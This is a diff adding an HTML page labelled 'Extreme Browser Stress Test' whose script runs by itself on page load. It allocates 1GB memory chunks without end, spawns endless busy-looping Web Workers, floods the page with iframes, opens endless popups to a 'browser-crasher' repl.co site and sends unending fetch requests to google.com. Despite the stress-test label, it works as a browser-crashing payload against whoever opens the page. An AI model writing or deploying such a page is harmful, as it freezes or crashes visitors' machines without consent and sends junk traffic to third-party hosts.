@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Extreme Browser Stress Test</title>
+    <style>
+        /* Make the body and HTML take up the full height and be white */
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            background-color: white;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+
+    <script>
+        // Memory allocation: continuously allocate large chunks of memory
+        function allocateMemory() {
+            let memoryLeak = [];
+            while (true) {
+                memoryLeak.push(new ArrayBuffer(1024 * 1024 * 1024)); // Allocate 1GB chunks repeatedly
+            }
+        }
+
+        // Spawn massive number of Web Workers to max out CPU usage
+        function spawnWorkers() {
+            while (true) {
+                new Worker("data:text/javascript," + encodeURIComponent("while(true);")); // Infinite loop in worker
+            }
+        }
+
+        // Create WebGL rendering in an infinite loop using THREE.js
+        function stressGPU() {
+            const canvas = document.createElement('canvas');
+            document.body.appendChild(canvas);
+            const renderer = new THREE.WebGLRenderer({ canvas });
+            const scene = new THREE.Scene();
+            const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+            camera.position.z = 5;
+
+            const geometry = new THREE.BoxGeometry();
+            const material = new THREE.MeshBasicMaterial({ color: Math.random() * 0xffffff });
+            const cube = new THREE.Mesh(geometry, material);
+            scene.add(cube);
+
+            function animate() {
+                requestAnimationFrame(animate);
+                cube.rotation.x += 0.05;
+                cube.rotation.y += 0.05;
+                renderer.render(scene, camera);
+            }
+
+            animate();
+        }
+
+        // Continuously create iframes with no delay (flood the DOM)
+        function floodIframes() {
+            while (true) {
+                var iframe = document.createElement('iframe');
+                iframe.src = 'https://browser-crasher.mishal0legit.repl.co';
+                iframe.width = 800;
+                iframe.height = 600;
+                document.body.appendChild(iframe);
+            }
+        }
+
+        // Continuously open popup windows
+        function openPopups() {
+            while (true) {
+                var popup = window.open('https://browser-crasher.mishal0legit.repl.co', '_blank', 'width=500,height=500');
+                popup.focus();
+            }
+        }
+
+        // Simulate network overload by fetching a URL in a loop
+        function overloadNetwork() {
+            while (true) {
+                fetch('https://google.com');
+            }
+        }
+
+        // Start all stress methods
+        function startStressTest() {
+            // Allocate memory in background
+            setTimeout(allocateMemory, 0);
+
+            // Spawn many workers
+            setTimeout(spawnWorkers, 0);
+
+            // Start rendering WebGL scenes
+            setTimeout(stressGPU, 0);
+
+            // Flood the page with iframes
+            setTimeout(floodIframes, 0);
+
+            // Open endless popups
+            setTimeout(openPopups, 0);
+
+            // Overload network requests
+            setTimeout(overloadNetwork, 0);
+        }
+
+        // Start the stress test as soon as the page is loaded
+        window.onload = function() {
+            startStressTest();
+        };
+    </script>
+
+    <!-- Include THREE.js from the local 'libs' folder -->
+    <script src="three.js"></script> <!-- Replace with your local path -->
+</body>
+</html>
